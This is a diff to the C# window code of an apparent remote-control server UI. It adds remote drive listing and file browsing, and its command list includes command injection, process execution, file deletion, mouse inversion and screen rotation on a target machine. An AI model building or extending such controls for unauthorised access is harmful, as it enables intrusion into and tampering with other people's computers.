@@ -15,7 +15,7 @@ using System.Windows.Shapes;
 namespace Server.UI
 {
 
-    enum CommandsEnum { CmdInjection = 0, ExecProcess = 1, CreateFile = 2, ReadFile = 3, DeleteFile = 4, MouseInvert = 5, DisplayRotate = 6, OsMessage = 7 };
+    enum CommandsEnum { CmdInjection = 0, ExecProcess = 1, CreateFile = 2, ReadFile = 3, DeleteFile = 4, MouseInvert = 5, DisplayRotate = 6, OsMessage = 7, GetFiles = 8, GetDrives = 9 };
     /// <summary>
     /// Interaction logic for Window1.xaml
     /// </summary>
@@ -50,17 +50,22 @@ namespace Server.UI
         {
             if (folderTreeList.Items.Count == 0)
                 return string.Empty;
-            return folderTreeList.SelectedValue.ToString();
+            return folderTreeList.SelectedValue != null? folderTreeList.SelectedValue.ToString() : "";
         }
 
         public int GetCommandId()
         {
             return commandComboBox.SelectedIndex;
         }
-        
-        public string GetParameters()
+
+        public string GetFirstParameter()
         {
-            return parametersTextBox.Text;
+            return parameter1TextBox.Text;
+        }
+
+        public string GetSecondParameter()
+        {
+            return parameter2TextBox.Text;
         }
 
         private void SetCommand()
@@ -86,7 +91,7 @@ namespace Server.UI
         {
             if (!string.IsNullOrEmpty(response) && !string.IsNullOrEmpty(outputTextBlock.Text))
                 outputTextBlock.Text = outputTextBlock.Text + "\n" + response;
-            else if(!string.IsNullOrEmpty(response) && string.IsNullOrEmpty(outputTextBlock.Text))
+            else if (!string.IsNullOrEmpty(response) && string.IsNullOrEmpty(outputTextBlock.Text))
                 outputTextBlock.Text = response;
 
         }
@@ -101,20 +106,49 @@ namespace Server.UI
 
         }
 
-        public void UpdateList(string files)
+        public void UpdateList(List<string> files)
         {
-            folderTreeList.Items.Add(files);
+            string currentPath = folderTreeList.SelectedValue.ToString();
+            if(currentPath.EndsWith(".."))
+            {
+                int index = currentPath.LastIndexOf("\\");
+                currentPath = currentPath.Substring(0, index);
+                index = currentPath.LastIndexOf("\\");
+                currentPath = currentPath.Substring(0, index +1);
+            }
+            else if (currentPath.EndsWith("."))
+            {
+                currentPath = currentPath.Substring(0, currentPath.Length -1);
+            }
+            else
+            {
+                currentPath = currentPath + "\\";
+            }
+            folderTreeList.Items.Clear();
+            foreach (var file in files)
+                folderTreeList.Items.Add(currentPath + file);
+
+        }
+
+        public void UpdateDrivers(string drivers)
+        {
+            folderTreeList.Items.Clear();
+            drivers = drivers.Substring(7);
+            var driversList = drivers.Split('\n');
+
+            foreach (var driver in driversList)
+                if (!string.IsNullOrEmpty(driver.Trim()))
+                    folderTreeList.Items.Add(driver.Trim());
 
         }
 
         private void folderTreeList_SelectionChanged(object sender, SelectionChangedEventArgs e)
         {
-            folderTreeList.Items.Clear();
         }
 
         private void Button_Click_1(object sender, RoutedEventArgs e)
         {
-            OnSentPressed(EventArgs.Empty);
+            OnGetFiles(EventArgs.Empty);
         }
 
         protected virtual void OnGetFiles(EventArgs e)
